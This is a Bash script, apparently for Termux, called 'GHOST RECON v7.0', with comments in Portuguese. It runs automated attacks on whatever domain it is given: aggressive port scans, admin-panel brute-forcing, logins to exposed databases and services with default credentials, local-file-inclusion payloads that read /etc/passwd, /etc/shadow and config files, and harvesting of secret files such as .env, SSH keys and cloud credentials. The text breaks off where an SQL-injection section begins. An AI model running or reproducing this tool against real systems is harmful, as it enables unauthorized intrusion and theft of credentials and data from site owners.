#!/data/data/com.termux/files/usr/bin/bash
# GHOST RECON v7.0 - Ultra Fast
# Uso: bash recon.sh alvo.com

TARGET="${1:-}"; [ -z "$TARGET" ] && read -p "Alvo: " TARGET
DOMAIN=$(echo "$TARGET" | sed 's~https\?://~~;s~www\.~~;s~/.*~~' | tr '[:upper:]' '[:lower:]' | tr -d ' ')
URL="https://$DOMAIN"
LOG="$HOME/recon_${DOMAIN}_$(date +%Y%m%d_%H%M%S).log"
TMP="/tmp/gr_$$"
mkdir -p "$TMP"
VULN=0

# cores
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; W='\033[1;37m'; N='\033[0m'; B='\033[1m'

v(){ ((VULN++)); echo -e "${R}[VULN]${N} $1" | tee -a "$LOG"; echo "[VULN] $1" >> "$TMP/vulns"; }
i(){ echo -e "${G}[+]${N} $1" | tee -a "$LOG"; }
w(){ echo -e "${Y}[!]${N} $1" | tee -a "$LOG"; }
s(){ echo -e "  ${C}>$N $1" | tee -a "$LOG"; }
t(){ echo -e "\n${W}${B}=== $1 ===${N}" | tee -a "$LOG"; }
adm(){ echo "$1" >> "$TMP/adm"; v "PAINEL ADM: $1"; }
dbx(){ echo "$1" >> "$TMP/db"; v "DB EXPOSTO: $1"; }
fex(){ echo "$1" >> "$TMP/files"; v "ARQUIVO: $1"; }

# limitar jobs — ajusta conforme CPU do device
MAX_JOBS=80

wait_jobs(){ while [ "$(jobs -rp | wc -l)" -ge "$MAX_JOBS" ]; do sleep 0.05; done; }

# ── deps ──────────────────────────────────────────────────────
for dep in curl dig nmap host whois python3 openssl nc traceroute; do
  command -v "$dep" &>/dev/null || pkg install "$dep" -y &>/dev/null 2>&1 &
done
wait

# ── resolve ───────────────────────────────────────────────────
IPV4=$(dig +short "$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
IP=$(echo "$IPV4" | head -1)
IPV6=$(dig +short "$DOMAIN" AAAA 2>/dev/null | head -1)
[ -z "$IP" ] && IP=$(host "$DOMAIN" 2>/dev/null | awk '/has address/{print $NF}' | head -1)
[ -z "$IP" ] && echo "ERRO: nao resolveu $DOMAIN" && exit 1

echo "GHOST RECON v7.0 | $DOMAIN | $IP | $(date)" | tee "$LOG"
i "IP: $IP | IPv6: ${IPV6:-n/a}"
[ "$(echo "$IPV4" | wc -l)" -gt 1 ] && w "Multiplos IPs — CDN/LB possivel"

# ================================================================
# FASE 1 — tudo que NAO depende de IP confirmado (paralelo total)
# ================================================================

# GEO
geo_fn(){
  t "GEOIP"
  G=$(curl -s --max-time 5 "http://ip-api.com/json/$IP?fields=country,countryCode,regionName,city,isp,org,as,proxy,hosting,lat,lon" 2>/dev/null)
  s "Pais:   $(echo $G|grep -o '"country":"[^"]*"'|cut -d'"' -f4) ($(echo $G|grep -o '"countryCode":"[^"]*"'|cut -d'"' -f4))"
  s "Cidade: $(echo $G|grep -o '"city":"[^"]*"'|cut -d'"' -f4) / $(echo $G|grep -o '"regionName":"[^"]*"'|cut -d'"' -f4)"
  s "ISP:    $(echo $G|grep -o '"isp":"[^"]*"'|cut -d'"' -f4)"
  s "Org:    $(echo $G|grep -o '"org":"[^"]*"'|cut -d'"' -f4)"
  s "AS:     $(echo $G|grep -o '"as":"[^"]*"'|cut -d'"' -f4)"
  LAT=$(echo $G|grep -o '"lat":[^,}]*'|cut -d: -f2)
  LON=$(echo $G|grep -o '"lon":[^,}]*'|cut -d: -f2)
  [ -n "$LAT" ] && s "Maps: https://maps.google.com/?q=$LAT,$LON"
  echo $G|grep -o '"proxy":true' &>/dev/null && v "PROXY/VPN no IP $IP"
  echo $G|grep -o '"hosting":true' &>/dev/null && w "Datacenter/Hosting"
  # geo de IPs extras em paralelo
  for xip in $(echo "$IPV4" | tail -n +2); do
    [ -n "$xip" ] || continue
    XG=$(curl -s --max-time 3 "http://ip-api.com/json/$xip?fields=country,city,isp" 2>/dev/null)
    s "GEO $xip: $(echo $XG|grep -o '"country":"[^"]*"'|cut -d'"' -f4)/$(echo $XG|grep -o '"city":"[^"]*"'|cut -d'"' -f4)/$(echo $XG|grep -o '"isp":"[^"]*"'|cut -d'"' -f4)"
  done
}

# DNS
dns_fn(){
  t "DNS + ZONE TRANSFER"
  for TYPE in A AAAA MX NS TXT CNAME SOA CAA SRV; do
    R=$(dig +short "$DOMAIN" $TYPE 2>/dev/null)
    [ -n "$R" ] && i "[$TYPE]" && echo "$R" | while read r; do [ -n "$r" ] && s "$r"; done
  done
  dig +short "$DOMAIN" NS 2>/dev/null | while read ns; do
    AX=$(dig axfr "$DOMAIN" @"$ns" 2>/dev/null)
    echo "$AX" | grep -qv "failed\|refused\|NOTAUTH\|Transfer" && v "ZONE TRANSFER via $ns!" && echo "$AX"|head -20|while read l; do s "$l"; done
  done
}

# WHOIS
whois_fn(){
  t "WHOIS"
  whois "$DOMAIN" 2>/dev/null | grep -iE "registrar|creation|expir|name.?server|email|country|abuse" | sort -u | head -10 | while read l; do s "$l"; done
  whois "$IP" 2>/dev/null | grep -iE "netname|country|org|cidr|inetnum|abuse" | sort -u | head -6 | while read l; do s "$l"; done
}

# HTTP headers + tech
http_fn(){
  t "HTTP + TECNOLOGIAS"
  HDR=$(curl -sI --max-time 6 "$URL" 2>/dev/null)
  PAGE=$(curl -sk --max-time 10 "$URL" 2>/dev/null)
  echo "$HDR" | grep -iE "^server:|^x-powered-by:|^x-generator:|^via:|^x-cache:" | while read l; do s "$l"; done
  CODE=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)
  TITLE=$(echo "$PAGE" | grep -oi '<title>[^<]*</title>' | sed 's/<[^>]*>//g' | head -1)
  s "HTTP: $CODE | Title: $TITLE"
  # CDN/WAF
  echo "$HDR" | grep -qi "cloudflare" && w "CDN: Cloudflare"
  echo "$HDR" | grep -qi "x-amz\|cloudfront" && w "CDN: AWS CloudFront"
  echo "$HDR" | grep -qi "sucuri\|incapsula" && w "WAF detectado"
  # Tech
  C="$PAGE$HDR"
  echo "$C"|grep -qi "wp-content\|wordpress" && i "CMS: WordPress"
  echo "$C"|grep -qi "joomla" && i "CMS: Joomla"
  echo "$C"|grep -qi "drupal" && i "CMS: Drupal"
  echo "$C"|grep -qi "magento" && i "Ecommerce: Magento"
  echo "$C"|grep -qi "shopify" && i "Ecommerce: Shopify"
  echo "$HDR"|grep -qi "server: nginx" && i "Servidor: NGINX"
  echo "$HDR"|grep -qi "server: apache" && i "Servidor: Apache"
  echo "$PAGE"|grep -qi "react\|__react" && i "Frontend: React"
  echo "$PAGE"|grep -qi "vue\b\|__vue__" && i "Frontend: Vue"
  echo "$PAGE"|grep -qi "angular\|ng-version" && i "Frontend: Angular"
  echo "$PAGE"|grep -qi "laravel_session" && i "Framework: Laravel"
  echo "$PAGE"|grep -qi "swagger-ui\|openapi" && w "Swagger/API Docs exposta"
  # sec headers
  echo "$HDR"|grep -qi "Strict-Transport-Security" || w "HSTS ausente"
  echo "$HDR"|grep -qi "X-Frame-Options" || w "X-Frame-Options ausente"
  echo "$HDR"|grep -qi "Content-Security-Policy" || w "CSP ausente"
  # salva page para outros modulos
  echo "$PAGE" > "$TMP/page"
  echo "$HDR" > "$TMP/hdr"
}

# SSL
ssl_fn(){
  t "SSL/TLS"
  CR=$(echo | timeout 7 openssl s_client -connect "$DOMAIN:443" -servername "$DOMAIN" 2>/dev/null)
  CERT=$(echo "$CR" | openssl x509 -noout -text 2>/dev/null)
  [ -z "$CERT" ] && w "SSL nao disponivel" && return
  echo "$CR" | openssl x509 -noout -subject -issuer -dates 2>/dev/null | while read l; do s "$l"; done
  SANS=$(echo "$CERT" | grep -A3 "Subject Alternative Name" | grep -oE "DNS:[^,\n]*|IP Address:[^,\n]*")
  [ -n "$SANS" ] && i "SANs:" && echo "$SANS" | while read sx; do s "$sx"; done
  for p in ssl3 tls1 tls1_1; do
    echo | timeout 3 openssl s_client -connect "$DOMAIN:443" -$p 2>&1 | grep -qi "Cipher\|handshake" && v "Protocolo inseguro: $p"
  done
}

# IP real / CDN bypass
hiddenip_fn(){
  t "IP REAL / CDN BYPASS"
  for sub in mail ftp smtp pop imap webmail cpanel whm api api2 dev dev2 stage test beta admin portal cdn ns1 ns2 vpn remote direct; do
    SIP=$(dig +short "$sub.$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    [ -n "$SIP" ] && [ "$SIP" != "$IP" ] && v "IP REAL em $sub.$DOMAIN -> $SIP"
  done
  dig +short "$DOMAIN" TXT 2>/dev/null | grep -oE 'ip4:[^ "]+|ip6:[^ "]+' | while read ipx; do v "SPF IP leak: $ipx"; done
  dig +short "$DOMAIN" MX 2>/dev/null | awk '{print $2}' | while read mx; do
    MXI=$(dig +short "$mx" A 2>/dev/null | head -1)
    [ -n "$MXI" ] && [ "$MXI" != "$IP" ] && v "MX IP diferente: $mx -> $MXI"
  done
  # crt.sh
  curl -s --max-time 10 "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
    python3 -c "
import sys,json
try:
  seen=set()
  for e in json.load(sys.stdin):
    for n in e.get('name_value','').split('\n'):
      n=n.strip().replace('*.','')
      if '$DOMAIN' in n and n not in seen: seen.add(n); print(n)
except: pass
" 2>/dev/null | sort | while read sub; do
    SIP=$(dig +short "$sub" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    [ -n "$SIP" ] && s "crt.sh: $sub -> $SIP"
  done
}

# email osint
email_fn(){
  t "EMAIL OSINT"
  SPF=$(dig +short "$DOMAIN" TXT 2>/dev/null | grep -i spf | head -1)
  [ -n "$SPF" ] && s "SPF: $SPF" || w "SPF nao configurado"
  DMARC=$(dig +short "_dmarc.$DOMAIN" TXT 2>/dev/null | head -1)
  [ -n "$DMARC" ] && s "DMARC: $DMARC" || w "DMARC ausente"
  for sel in default google selector1 selector2 k1 mail dkim 2024 2025; do
    D=$(dig +short "${sel}._domainkey.$DOMAIN" TXT 2>/dev/null)
    [ -n "$D" ] && s "DKIM [$sel]: $(echo $D | head -c 80)"
  done
}

# subdomains
subdomain_fn(){
  t "SUBDOMINIOS"
  WORDLIST="www mail ftp smtp pop imap webmail cpanel whm api api2 api3 dev dev2 stage staging test beta alpha cdn static assets app apps mobile m wap admin portal vpn remote ns1 ns2 mx mx1 support help docs status dashboard git jenkins ci cd prod uat qa old backup"
  for sub in $WORDLIST; do
    (
    SIP=$(dig +short "$sub.$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    if [ -n "$SIP" ]; then
      [ "$SIP" != "$IP" ] && v "Subdomain IP dif: $sub.$DOMAIN -> $SIP" || s "$sub.$DOMAIN -> $SIP"
      SBODY=$(curl -sk --max-time 3 "https://$sub.$DOMAIN" 2>/dev/null | head -c 200)
      echo "$SBODY" | grep -qiE "login|admin|dashboard|panel|phpmyadmin|grafana" && adm "https://$sub.$DOMAIN"
    fi
    ) &
    wait_jobs
  done
  wait
  curl -s --max-time 8 "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" 2>/dev/null | grep -v "error\|limit\|API" | head -10 | while read l; do [ -n "$l" ] && s "HT: $l"; done
}

# reverse IP
reverse_fn(){
  t "REVERSE IP"
  host "$IP" 2>/dev/null | while read l; do s "PTR: $l"; done
  REV=$(curl -s --max-time 7 "https://api.hackertarget.com/reverseiplookup/?q=$IP" 2>/dev/null | grep -v "error\|limit\|API")
  COUNT=$(echo "$REV" | wc -l)
  [ -n "$REV" ] && i "$COUNT dominios no mesmo IP:" && echo "$REV" | head -10 | while read d; do [ -n "$d" ] && s "$d"; done
  [ "$COUNT" -gt 10 ] && s "... +$(( COUNT-10 )) dominios"
}

# traceroute
trace_fn(){
  t "TRACEROUTE"
  traceroute -m 8 -w 1 "$IP" 2>/dev/null | while read line; do
    HIP=$(echo "$line" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
    if [ -n "$HIP" ]; then
      XG=$(curl -s --max-time 2 "http://ip-api.com/json/$HIP?fields=country,city" 2>/dev/null)
      CTR=$(echo $XG|grep -o '"country":"[^"]*"'|cut -d'"' -f4)
      [ -n "$CTR" ] && s "$line [$CTR/$(echo $XG|grep -o '"city":"[^"]*"'|cut -d'"' -f4)]" || s "$line"
    else s "$line"; fi
  done
}

# ── FASE 1: lanca todos em paralelo ───────────────────────────
geo_fn &
dns_fn &
whois_fn &
http_fn &
ssl_fn &
hiddenip_fn &
email_fn &
subdomain_fn &
reverse_fn &
trace_fn &
wait

# ================================================================
# FASE 2 — scans ativos (nmap + admin panels + DB + files)
# todos em paralelo entre si, cada um usa paralelo interno
# ================================================================

# nmap
nmap_fn(){
  t "NMAP PORT SCAN"
  nmap -sV --open -T5 --min-rate 5000 --max-retries 1 \
    -p 21,22,23,25,53,80,110,143,443,445,587,993,995,\
1433,1521,2181,2375,2379,2380,\
3000,3306,3307,3389,4369,4848,\
5000,5432,5433,5601,5672,5984,\
6379,6432,7000,7474,7687,\
8080,8081,8086,8123,8443,8888,8983,\
9000,9042,9090,9200,9300,\
11211,15672,19000,27017,28015,33060,50000 \
"$IP" 2>/dev/null | grep "open" | while read line; do s "PORT: $line"; done
}

# admin panels
adm_fn(){
  t "PAINEIS ADM / LOGIN"
  PATHS=(
    admin/ administrator/ login/ signin/ dashboard/ panel/ control/ backend/ manage/ manager/
    cp/ controlpanel/ admincp/ moderator/ superadmin/ staff/
    phpmyadmin/ pma/ PMA/ phpmyadmin/index.php adminer adminer.php db/adminer.php
    pgadmin/ pgadmin4/ pgadmin4/browser/ phpredisadmin/ redis-admin/ redis-commander/
    mongo-express/ cpanel/ whm/ plesk/ webmin/ directadmin/
    wp-admin/ wp-login.php administrator/ user/login
    grafana/ grafana/login kibana/ app/kibana
    prometheus/ portainer/ rancher/ netdata/ zabbix/ zabbix/index.php
    nagios/ cacti/ jenkins/ jenkins/login gitlab/ gitea/ sonarqube/ nexus/
    roundcube/ webmail/ squirrelmail/
    swagger-ui/ swagger/ api-docs/ openapi.json swagger.json
    solr/ solr/\#/ actuator/ actuator/env actuator/health
    server-status server-info nginx_status
    console/ cgi-bin/ manager/html jmx-console/ h2-console/ h2/
    superset/ metabase/ redash/ jupyter/ notebook/
    install/ setup/ setup.php install.php
  )
  for path in "${PATHS[@]}"; do
    for HOST in "$DOMAIN" "$IP"; do
      for proto in https http; do
        for PORT in "" :8080 :8443 :8888 :9090 :3000 :4000 :9000 :5000 :7000; do
          (
          TURL="$proto://$HOST$PORT/$path"
          CODE=$(curl -sk --max-time 2 -o "$TMP/adm_${RANDOM}" -w "%{http_code}" -L "$TURL" 2>/dev/null)
          F="$TMP/adm_${RANDOM}"
          case "$CODE" in
            200)
              BODY=$(cat "$F" 2>/dev/null | head -c 400)
              echo "$BODY" | grep -qiE "login|password|username|admin|dashboard|sign.?in|panel|console|phpmyadmin|grafana|kibana|jenkins|authenticate" && adm "$TURL"
              ;;
            401) v "Auth required ($CODE): $TURL" ;;
          esac
          rm -f "$F" 2>/dev/null
          ) &
          wait_jobs
        done
      done
    done
  done
  wait
}

# DB ports + exploit
db_fn(){
  t "DATABASE PORTS + EXPLOIT"
  declare -A DBPORTS=(
    [3306]="MySQL" [3307]="MySQL-Alt" [33060]="MySQL-X"
    [5432]="PostgreSQL" [5433]="PG-Alt" [6432]="PgBouncer"
    [27017]="MongoDB" [27018]="MongoDB-2" [27019]="MongoDB-3"
    [6379]="Redis" [6380]="Redis-TLS"
    [9200]="Elasticsearch" [9300]="ES-Transport"
    [5984]="CouchDB" [4000]="CouchDB-Alt"
    [8529]="ArangoDB" [7474]="Neo4j-HTTP" [7687]="Neo4j-Bolt"
    [9042]="Cassandra" [2181]="Zookeeper"
    [11211]="Memcached" [15672]="RabbitMQ-Mgmt" [5672]="RabbitMQ"
    [1433]="MSSQL" [1521]="Oracle" [50000]="DB2"
    [8086]="InfluxDB" [28015]="RethinkDB" [8983]="Apache-Solr"
    [9090]="Prometheus" [3000]="Grafana" [5601]="Kibana"
    [8123]="ClickHouse" [19000]="ClickHouse-TCP"
    [2379]="etcd" [2380]="etcd-Peer" [2375]="Docker-API"
  )
  for port in $(echo "${!DBPORTS[@]}" | tr ' ' '\n' | sort -n); do
    SVC="${DBPORTS[$port]}"
    (
    timeout 1 bash -c "echo ''>/dev/tcp/$IP/$port" 2>/dev/null || exit
    dbx "$SVC em $IP:$port"
    case "$port" in
      3306|3307|33060)
        BNR=$(timeout 2 bash -c "cat</dev/tcp/$IP/$port 2>/dev/null" | strings 2>/dev/null | head -c 120)
        [ -n "$BNR" ] && s "MySQL Banner: $BNR"
        s "URL: mysql://$IP:$port"
        s "Paineis: http://$DOMAIN/phpmyadmin | http://$DOMAIN/adminer | http://$IP:8080/phpmyadmin"
        ;;
      5432|5433|6432)
        s "URL: postgresql://$IP:$port"
        s "pgAdmin: http://$IP:5050 | http://$DOMAIN/pgadmin4"
        ;;
      27017|27018|27019)
        s "URL: mongodb://$IP:$port"
        H=$(curl -s --max-time 3 "http://$IP:28017/" 2>/dev/null)
        echo "$H"|grep -qi "mongo\|database" && {
          v "MongoDB HTTP aberta: http://$IP:28017/"
          s "DBs:    http://$IP:28017/listDatabases"
          s "Status: http://$IP:28017/serverStatus"
          adm "http://$IP:28017/"
        }
        ;;
      6379|6380)
        PONG=$(printf "*1\r\n\$4\r\nPING\r\n" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null)
        echo "$PONG"|grep -qi "PONG" && {
          v "Redis SEM SENHA: redis://$IP:$port"
          INFO=$(printf "*1\r\n\$4\r\nINFO\r\n" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null | grep -E "redis_version|os:|role:" | head -3)
          echo "$INFO" | while read l; do s "$l"; done
          DIR=$(printf "*3\r\n\$6\r\nCONFIG\r\n\$3\r\nGET\r\n\$3\r\ndir\r\n" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null | strings | tail -1)
          [ -n "$DIR" ] && s "dir: $DIR"
        }
        ;;
      9200|9300)
        ES=$(curl -s --max-time 4 "http://$IP:9200/" 2>/dev/null)
        echo "$ES"|grep -qi "cluster_name" && {
          v "Elasticsearch SEM AUTH: http://$IP:9200"
          s "Indices:  http://$IP:9200/_cat/indices?v"
          s "Nodes:    http://$IP:9200/_cat/nodes?v"
          s "All:      http://$IP:9200/_all/_search?pretty"
          s "Cluster:  http://$IP:9200/_cluster/health?pretty"
          CIDX=$(curl -s --max-time 3 "http://$IP:9200/_cat/indices?v" 2>/dev/null | head -4)
          [ -n "$CIDX" ] && s "Indices: $CIDX"
          adm "http://$IP:9200"
        }
        ;;
      5984|4000)
        DBS=$(curl -s --max-time 3 "http://$IP:$port/_all_dbs" 2>/dev/null)
        echo "$DBS"|grep -q "\[" && {
          v "CouchDB SEM AUTH: http://$IP:$port"
          s "DBs:   http://$IP:$port/_all_dbs  -> $DBS"
          s "Admin: http://$IP:$port/_utils"
          adm "http://$IP:$port/_utils"
        }
        ;;
      11211)
        ST=$(echo "stats" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null | head -3)
        [ -n "$ST" ] && v "Memcached SEM AUTH: $IP:$port (risco DDoS)" && echo "$ST"|while read l; do s "$l"; done
        ;;
      5601)
        KIB=$(curl -s --max-time 4 "http://$IP:5601/api/status" 2>/dev/null)
        echo "$KIB"|grep -qi "kibana\|version" && {
          v "Kibana SEM AUTH: http://$IP:5601"
          s "App:      http://$IP:5601/app/kibana"
          s "Discover: http://$IP:5601/app/discover"
          s "Dev:      http://$IP:5601/app/dev_tools"
          adm "http://$IP:5601/app/kibana"
        }
        ;;
      3000)
        GRAF=$(curl -s --max-time 3 "http://$IP:3000/api/health" 2>/dev/null)
        echo "$GRAF"|grep -qi "ok" && {
          GA=$(curl -s --max-time 3 -u "admin:admin" "http://$IP:3000/api/org" 2>/dev/null)
          echo "$GA"|grep -qi '"id"' && {
            v "Grafana admin:admin OK: http://$IP:3000"
            adm "http://$IP:3000 (admin:admin)"
            s "Dashboards: http://$IP:3000/api/dashboards/home"
            s "Users:      http://$IP:3000/api/users"
            s "Data srcs:  http://$IP:3000/api/datasources"
          } || adm "http://$IP:3000 (auth required)"
        }
        ;;
      9090)
        P=$(curl -s --max-time 3 "http://$IP:9090/-/healthy" 2>/dev/null)
        echo "$P"|grep -qi "Healthy\|OK" && {
          v "Prometheus SEM AUTH: http://$IP:9090"
          adm "http://$IP:9090/graph"
          s "Metrics: http://$IP:9090/metrics"
          s "Targets: http://$IP:9090/api/v1/targets"
          s "Config:  http://$IP:9090/api/v1/status/config"
        }
        ;;
      8086)
        PC=$(curl -s --max-time 3 -o /dev/null -w "%{http_code}" "http://$IP:8086/ping" 2>/dev/null)
        [ "$PC" = "204" ] && {
          v "InfluxDB SEM AUTH: http://$IP:8086"
          DBS=$(curl -s --max-time 3 "http://$IP:8086/query?q=SHOW%20DATABASES" 2>/dev/null)
          [ -n "$DBS" ] && s "DBs: $DBS"
          s "Query: http://$IP:8086/query?q=SHOW+DATABASES"
        }
        ;;
      8123)
        CH=$(curl -s --max-time 3 "http://$IP:8123/?query=SELECT+1" 2>/dev/null)
        [ "$CH" = "1" ] && {
          v "ClickHouse SEM AUTH: http://$IP:8123"
          DBS=$(curl -s --max-time 3 "http://$IP:8123/?query=SHOW+DATABASES" 2>/dev/null)
          s "DBs: $DBS | Play: http://$IP:8123/play"
          adm "http://$IP:8123/play"
        }
        ;;
      2379)
        ET=$(curl -s --max-time 3 "http://$IP:2379/v3/cluster/member/list" 2>/dev/null)
        echo "$ET"|grep -qi "members\|header" && {
          v "etcd SEM AUTH: http://$IP:2379 (Kubernetes secrets!)"
          s "Members: http://$IP:2379/v3/cluster/member/list"
          s "Keys:    http://$IP:2379/v2/keys/"
        }
        ;;
      2181)
        ZK=$(echo "ruok" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null)
        [ "$ZK" = "imok" ] && v "Zookeeper SEM AUTH: $IP:$port"
        ;;
      15672)
        RB=$(curl -s --max-time 3 -u "guest:guest" "http://$IP:15672/api/overview" 2>/dev/null)
        echo "$RB"|grep -qi "rabbitmq_version" && {
          v "RabbitMQ guest:guest OK: http://$IP:15672"
          adm "http://$IP:15672 (guest:guest)"
          s "Queues: http://$IP:15672/api/queues | Users: http://$IP:15672/api/users"
        }
        ;;
      8983)
        SOLR=$(curl -s --max-time 3 "http://$IP:8983/solr/admin/info/system?wt=json" 2>/dev/null)
        echo "$SOLR"|grep -qi "solr_spec_version" && {
          v "Apache Solr SEM AUTH: http://$IP:8983"
          adm "http://$IP:8983/solr"
          s "Cores: http://$IP:8983/solr/admin/cores?action=STATUS&wt=json"
        }
        ;;
      1433|1434)
        v "MSSQL exposto: $IP:$port"
        s "URL: mssql://$IP:$port | Reports: http://$DOMAIN/reportserver"
        ;;
      1521) v "Oracle exposto: $IP:$port" && s "URL: oracle://$IP:$port" ;;
      7474)
        NEO=$(curl -s --max-time 3 "http://$IP:7474/" 2>/dev/null)
        echo "$NEO"|grep -qi "neo4j\|bolt" && {
          v "Neo4j exposto: http://$IP:7474"
          adm "http://$IP:7474/browser/"
          NA=$(curl -s --max-time 3 -u "neo4j:neo4j" "http://$IP:7474/db/data/" 2>/dev/null)
          echo "$NA"|grep -qi "neo4j_version" && v "Neo4j neo4j:neo4j OK!"
        }
        ;;
      2375)
        DOCK=$(curl -s --max-time 3 "http://$IP:2375/version" 2>/dev/null)
        echo "$DOCK"|grep -qi "Version\|ApiVersion" && {
          v "Docker API SEM AUTH: http://$IP:2375 — CRITICO!"
          adm "http://$IP:2375/containers/json"
          s "Containers: http://$IP:2375/containers/json"
          s "Images:     http://$IP:2375/images/json"
          s "Info:       http://$IP:2375/info"
          CTNR=$(curl -s --max-time 3 "http://$IP:2375/containers/json" 2>/dev/null | python3 -c "import sys,json; [print(c.get('Image','?'),c.get('Status','?')) for c in json.load(sys.stdin)]" 2>/dev/null | head -4)
          [ -n "$CTNR" ] && s "Containers: $CTNR"
        }
        ;;
      8529)
        ARA=$(curl -s --max-time 3 "http://$IP:8529/_api/version" 2>/dev/null)
        echo "$ARA"|grep -qi "version\|arangodb" && {
          v "ArangoDB exposto: http://$IP:8529"
          adm "http://$IP:8529/_db/_system/_admin/aardvark/index.html"
        }
        ;;
    esac
    ) &
    wait_jobs
  done
  wait
}

# files vuln
files_fn(){
  t "ARQUIVOS VULNERAVEIS / LFI / BACKUP"

  # LFI
  LFI_PAYLOADS=(
    "../../../../../../etc/passwd"
    "../../../../../../etc/shadow"
    "../../../../../../proc/self/environ"
    "../../../../../../var/log/apache2/access.log"
    "../../../../../../var/log/nginx/access.log"
    "../../../../../../etc/mysql/my.cnf"
    "../../../../windows/win.ini"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "php://filter/read=convert.base64-encode/resource=config.php"
    "php://filter/read=convert.base64-encode/resource=wp-config.php"
    "php://filter/read=convert.base64-encode/resource=../config.php"
    "expect://id"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "....//....//....//etc//passwd"
    "/etc/passwd%00"
  )
  LFI_PARAMS=(file page path include template doc view lang module read source load f p)
  for param in "${LFI_PARAMS[@]}"; do
    for payload in "${LFI_PAYLOADS[@]}"; do
      (
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      R=$(curl -sk --max-time 4 "$URL/?$param=$ENC" 2>/dev/null)
      echo "$R"|grep -qiE "root:.*:0:|bin:/bin|\[extensions\]|\[boot loader\]|PHP Version" && {
        v "LFI: ?$param= | $URL/?$param=$ENC"
        echo "$R"|grep -E "root:|bin:|daemon:" | head -2 | while read l; do s "$l"; done
      }
      ) &
      wait_jobs
    done
  done

  # sensitive files
  SFILES=(
    .env .env.local .env.production .env.development .env.staging .env.backup .env.old .env.bak
    config.php config.php.bak config.php~ wp-config.php wp-config.php.bak wp-config.php~ wp-config.php.old
    settings.php database.php db.php connection.php
    .git/config .git/HEAD .git/COMMIT_EDITMSG .git/logs/HEAD .git/packed-refs
    .svn/entries .htpasswd .htaccess .bash_history .ssh/id_rsa id_rsa
    phpinfo.php info.php test.php debug.php shell.php cmd.php
    backup.zip backup.tar.gz backup.sql site.zip database.sql dump.sql mysql.sql
    docker-compose.yml .dockerenv
    composer.json package.json
    error.log access.log debug.log app.log storage/logs/laravel.log wp-content/debug.log
    config.yml config.yaml config.json secrets.json appsettings.json web.config
    application.properties application.yml settings.py
    config/database.yml config/secrets.yml config/master.key
    .aws/credentials credentials.json service-account.json
    server.key private.key ssl.key domain.key
    adminer.php phpmyadmin/config.inc.php
    Thumbs.db .DS_Store
    includes/config.php inc/config.php src/config.php app/config.php
    sites/default/settings.php
    .travis.yml Jenkinsfile .gitlab-ci.yml
  )
  for f in "${SFILES[@]}"; do
    (
    F="$TMP/sf_${RANDOM}"
    CODE=$(curl -sk --max-time 3 -o "$F" -w "%{http_code}" "$URL/$f" 2>/dev/null)
    if [ "$CODE" = "200" ]; then
      SZ=$(wc -c < "$F" 2>/dev/null || echo 0)
      if [ "$SZ" -gt 50 ]; then
        CONT=$(cat "$F" 2>/dev/null | head -c 500)
        if echo "$CONT"|grep -qiE "password|passwd|secret|api_key|token|DB_|mysql|redis|mongo|connect|AKIA|sk_live|-----BEGIN|jdbc:|mongodb://|redis://"; then
          fex "$URL/$f ($SZ bytes)"
          echo "$CONT"|grep -iE "password|passwd|secret|api_key|token|DB_|AKIA" | head -3 | while read l; do s "  $l"; done
        elif echo "$f"|grep -qiE "backup|\.zip|\.sql|\.tar|dump|\.bak"; then
          fex "$URL/$f ($SZ bytes — backup!)"
        else
          w "Acessivel ($SZ bytes): $URL/$f"
        fi
      fi
    fi
    rm -f "$F" 2>/dev/null
    ) &
    wait_jobs
  done

  # .git
  GIT=$(curl -sk --max-time 4 "$URL/.git/config" 2>/dev/null)
  echo "$GIT"|grep -qi "\[core\]\|\[remote\]" && {
    v ".git EXPOSTO: $URL/.git/config"
    fex "$URL/.git/config"
    s "HEAD:   $URL/.git/HEAD"
    s "Log:    $URL/.git/logs/HEAD"
    REM=$(echo "$GIT" | grep "url = " | head -1 | xargs)
    [ -n "$REM" ] && s "Remote: $REM"
  }
  wait
}

# dir brute
dir_fn(){
  t "DIRECTORY BRUTE"
  DIRS=(
    api api/v1 api/v2 api/v3 rest/api graphql
    swagger swagger-ui swagger.json openapi.json api-docs redoc
    phpinfo.php info.php test.php debug.php
    actuator actuator/env actuator/health actuator/beans
    server-status server-info nginx_status php-fpm-status
    uploads upload files media img images static assets content
    backup backups bkp bak old archive tmp temp
    sitemap.xml robots.txt security.txt .well-known/security.txt
    cgi-bin cgi scripts WEB-INF/ META-INF/
    wp-content/uploads wp-json wp-json/wp/v2/users xmlrpc.php
    vendor node_modules .env .git .svn docker-compose.yml
    dev staging test uat qa prod beta
  )
  for dir in "${DIRS[@]}"; do
    (
    F="$TMP/dir_${RANDOM}"
    CODE=$(curl -sk --max-time 3 -o "$F" -w "%{http_code}" "$URL/$dir" 2>/dev/null)
    SZ=$(wc -c < "$F" 2>/dev/null || echo 0)
    case "$CODE" in
      200) [ "$SZ" -gt 100 ] && v "DIR acessivel ($CODE, ${SZ}b): $URL/$dir" ;;
      301|302) s "Redirect ($CODE): $URL/$dir" ;;
      401) s "Auth required: $URL/$dir" ;;
      403) s "Forbidden: $URL/$dir" ;;
    esac
    rm -f "$F" 2>/dev/null
    ) &
    wait_jobs
  done
  wait
}

# sqli
sqli_fn(){
  t "SQL INJECTION"
